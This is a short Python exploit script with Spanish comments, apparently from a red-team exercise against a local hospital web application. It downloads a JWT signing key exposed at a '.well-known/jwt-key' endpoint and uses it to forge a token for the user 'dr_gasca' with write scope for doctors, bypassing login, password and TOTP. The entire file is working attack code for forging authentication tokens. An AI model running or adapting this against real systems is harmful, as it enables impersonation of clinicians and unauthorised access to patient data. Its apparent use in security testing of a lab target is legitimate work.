"""
ATAQUE: falsificacion de JWT a partir de la clave de firma expuesta en
http://localhost:8000/.well-known/jwt-key (Vulnerabilidad RT-01).

Con esta clave fabricamos un token para "dr_gasca" con el scope
medico:escribir, SIN pasar por login, password ni TOTP.
"""
import time
import json
import requests
from authlib.jose import jwt

JWT_KEY_URL = "http://localhost:8000/.well-known/jwt-key"

def forjar_token(sub="dr_gasca", scope="paciente:leer medico:escribir",
                  aud="hospital-web", iss="http://localhost:8000"):
    cfg = requests.get(JWT_KEY_URL).json()
    key, alg = cfg["key"], cfg["alg"]

    now = int(time.time())
    header = {"alg": alg}
    payload = {
        "iss": iss,
        "sub": sub,
        "aud": aud,
        "scope": scope,
        "iat": now,
        "exp": now + 3600,
    }
    token = jwt.encode(header, payload, key).decode()
    return token

if __name__ == "__main__":
    token = forjar_token()
    print("Token JWT forjado (sin login, sin password, sin TOTP):")
    print(token)
